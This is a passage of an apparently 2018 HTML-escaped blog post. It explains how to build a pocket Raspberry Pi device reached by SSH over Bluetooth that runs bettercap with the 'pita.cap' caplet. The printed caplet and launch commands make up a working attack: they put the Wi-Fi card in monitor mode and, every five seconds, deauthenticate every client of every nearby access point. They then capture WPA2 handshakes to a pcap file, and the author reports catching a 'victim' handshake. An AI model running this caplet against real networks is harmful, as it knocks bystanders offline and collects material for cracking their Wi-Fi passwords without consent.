class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003eauto lo\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eiface lo inet loopback\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eallow-hotplug wlan0\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eiface wlan0 inet static\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eFrom the board now, disable wpa_supplicant and reboot:\u003c/p\u003e\n\u003cfigure class=\"highlight sh\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003eservice wpa_supplicant \u003cspan class=\"built_in\"\u003edisable\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ereboot\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eAfter reboot, you’ll be able to connect to the board via bluetooth.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2018/07/bt.png\" alt=\"bt\"/\u003e\u003c/p\u003e\n\u003cp\u003eYour system (this depends on the system you’re using, on most GNU/Linux distributions and Android this is basically automatically detected) should now have a new DHCP based \u003ccode\u003ePita Network\u003c/code\u003e entry in the network manager:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2018/07/net1.png\" alt=\"pita network\"/\u003e\u003c/p\u003e\n\u003cp\u003eOnce connected, you should see a new \u003ccode\u003ebnep0\u003c/code\u003e network interface:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2018/07/net2.png\" alt=\"ifconfig\"/\u003e\u003c/p\u003e\n\u003cp\u003eYou can finally ssh to your PITA board via bluetooth now :)\u003c/p\u003e\n\u003cfigure class=\"highlight sh\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"string\"\u003e\u0026#34;192.168.20.99 pita\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /etc/hosts\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003essh root@pita\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003ch3 id=\"0x03-Having-fun-with-wlan0-and-bettercap\"\u003e\u003ca href=\"#0x03-Having-fun-with-wlan0-and-bettercap\" class=\"headerlink\" title=\"[0x03] Having fun with wlan0 and bettercap\"\u003e\u003c/a\u003e[0x03] Having fun with wlan0 and bettercap\u003c/h3\u003e\u003cp\u003e\u003cstrong\u003eIMPORTANT\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eIn order to install bettercap and download the caplet, you will need internet connectivity on the rpi, but we just freed wlan0 for injection, so you’ll either have to plug some ethernet adapter, smartphone in tethering mode, etc on the mini usb port now, or perform these steps while the board is still connected to your WiFi during section 0x01.\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eNow that we can power our board either from a powerbank or the smartphone itself and we can connect to it via SSH over bluetooth, the next step is to install bettercap itself, we will compile it directly on the PITA, it’ll take a while but it’s very easy:\u003c/p\u003e\n\u003cfigure class=\"highlight sh\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003eapt install golang libpcap-dev libnetfilter-queue-dev wget build-essential\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# you should make this persistent in your .bashrc or .zshrc file\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"built_in\"\u003eexport\u003c/span\u003e GOPATH=/root/gocode\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003emkdir -p \u003cspan class=\"variable\"\u003e$GOPATH\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ego get github.com/bettercap/bettercap\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# wait\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# let\u0026#39;s install it for everyone to enjoy ^_^\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"built_in\"\u003ecd\u003c/span\u003e /root/gocode/src/github.com/bettercap/bettercap\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003emake\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003emake install\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# let\u0026#39;s download the pita.cap caplet\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"built_in\"\u003ecd\u003c/span\u003e /usr/share/bettercap/caplets/\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ewget \u003cspan class=\"string\"\u003e\u0026#34;https://raw.githubusercontent.com/bettercap/caplets/master/pita.cap\u0026#34;\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eThe \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/bettercap/caplets/blob/master/pita.cap\"\u003epita.cap\u003c/a\u003e caplet will take care of starting wlan0 in monitor mode, periodically send deauth packets and also sniffing for WPA2 handshakes as they arrive, you can launch it and keep it persistent with something like screen or tmux. It is a basic example of what you can do now, many other functionalities can be found in the \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/bettercap/caplets\"\u003ecaplets repo\u003c/a\u003e and generally in the project \u003ca target=\"_blank\" rel=\"noopener\" href=\"https://github.com/bettercap/bettercap/wiki\"\u003ewiki\u003c/a\u003e:\u003c/p\u003e\n\u003cfigure class=\"highlight plain\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e4\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e6\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e7\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e8\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e9\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e10\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e11\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e12\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e13\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e14\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e15\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e16\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e17\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e18\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e19\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e20\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e21\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e22\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e23\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e24\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e25\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e26\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e27\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e28\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e29\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e30\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e31\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e# More info about this caplet: https://twitter.com/evilsocket/status/1021367629901115392\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eset $ {bold}😈 » {reset}\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e# make sure wlan0 is in monitor mode\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e# ref: https://github.com/offensive-security/kali-arm-build-scripts/blob/master/rpi3-nexmon.sh\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e!monstop\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e!monstart\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e# every 5 seconds:\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e# - clear the screen\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e# - show the list of nearby access points \u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e# - deauth every client from each one of them\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eset ticker.period 5\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eset ticker.commands clear; wifi.show; wifi.deauth ff:ff:ff:ff:ff:ff\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e# sniff EAPOL frames ( WPA handshakes ) and save them to a pcap file.\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eset net.sniff.verbose true\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eset net.sniff.filter ether proto 0x888e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eset net.sniff.output wpa.pcap\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e# uncomment to only hop on these channels:\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e# wifi.recon.channel 1,2,3\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ewifi.recon on\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eticker on\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003enet.sniff on\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e# we\u0026#39;ll see lots of probes after each deauth, just skip the noise ...\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eevents.ignore wifi.client.probe\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e# start fresh\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eevents.clear\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003eclear\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eTo start bettercap with this caplet:\u003c/p\u003e\n\u003cfigure class=\"highlight sh\"\u003e\u003ctable\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd class=\"gutter\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003e1\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e2\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e3\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003ctd class=\"code\"\u003e\u003cpre\u003e\u003cspan class=\"line\"\u003eifconfig wlan0 up\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003ebettercap -iface wlan0 -caplet /usr/share/bettercap/caplets/pita.cap\u003c/span\u003e\u003cbr/\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"comment\"\u003e# enjoy ^_^\u003c/span\u003e\u003c/span\u003e\u003cbr/\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003c/figure\u003e\n\u003cp\u003eJust after a few minutes my prototype was able to deauth and capture the handshake of some device:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/images/2018/07/victim.png\" alt=\"victim\"/\u003e\u003c/p\u003e\n\u003cp\u003eI hope I did not forget about any step, the btnep part specifically was a little bit tricky to setup, let me know in the comments if something doesn’t work for you and I’ll try to help and fix this writeup, as usual, \u003cstrong\u003eenjoy!\u003c/strong\u003e\u003c/p\u003e\n\u003ccenter\u003e\n\u003cimg src=\"https://abs.twimg.com/emoji/v2/72x72/1f984.png\"/\u003e\n\u003c/center\u003e\n\u003c/div\u003e",
  "Date": "2018-07-28T17:01:56Z",
  "Author": "Simone Margaritelli"
}